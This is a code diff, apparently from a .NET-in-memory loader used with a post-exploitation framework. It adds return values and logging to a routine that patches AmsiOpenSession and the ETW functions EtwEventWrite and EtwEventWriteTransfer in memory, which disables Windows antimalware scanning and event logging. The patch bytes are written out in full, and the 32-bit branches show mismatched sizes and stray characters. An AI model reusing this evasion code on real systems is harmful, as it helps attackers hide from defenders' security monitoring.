@@ -348,10 +348,13 @@ mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainNam
     return nullptr;
 }
 
-void patchFunction(PVOID address, const char* patch, DWORD patchSize){
+bool patchFunction(const char* name, PVOID address, const char* patch, DWORD patchSize){
 
     BOF_LOCAL(NTDLL, NtProtectVirtualMemory);
     BOF_LOCAL(msvcrt, memcpy);
+    BOF_LOCAL(KERNEL32, GetLastError);
+
+    bool result = false;
 
     if(address != nullptr){
 
@@ -362,8 +365,14 @@ void patchFunction(PVOID address, const char* patch, DWORD patchSize){
         if(NT_SUCCESS(NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect))){
             memcpy(address, patch, patchSize);
             NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
+            result = true;
+            log("[+] Patched %s successfully", name);
+        }else{
+            log("[!] Failed to patch %s with error 0x%08x", name, GetLastError());
         }
     }
+
+    return result;
 }
 
 void patchAmsiEtw(){
@@ -379,20 +388,23 @@ void patchAmsiEtw(){
         amsi = LoadLibraryA("amsi.dll");
 
     if(amsi != nullptr){
+
 #ifdef __x86_64
-        patchFunction(PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x48\x31\xC0", 3);
+        patchFunction("AMSI", PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x48\x31\xC0", 3);
 #else
-        patchFunction(PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x31\xC0", 3);
+        patchFunction("AMSI", PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x31\xC0", 3);
 #endif
+    }else{
+        log("[=] No AMSI available on this system to patch", 0);
     }
 
     if(ntdll != nullptr){
 #ifdef __x86_64
-        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWrite")), "\xc3", 1);
-        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), "\xc3", 1);
+        patchFunction("EtwEventWrite", PVOID(GetProcAddress(ntdll, "EtwEventWrite")), "\xc3", 1);
+        patchFunction("EtwEventWriteTransfer", PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), "\xc3", 1);
 #else
-        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWrite")), " \xc2\x14\x00\x00", 4);
-        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), " \xc2\x14\x00\x00", 4);
+        patchFunction("EtwEventWrite", PVOID(GetProcAddress(ntdll, "EtwEventWrite")), " \xc2\x14\x00\x00", 4);
+        patchFunction("EtwEventWriteTransfer", PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), " \xc2\x14\x00\x00", 4);
 #endif
     }
 }
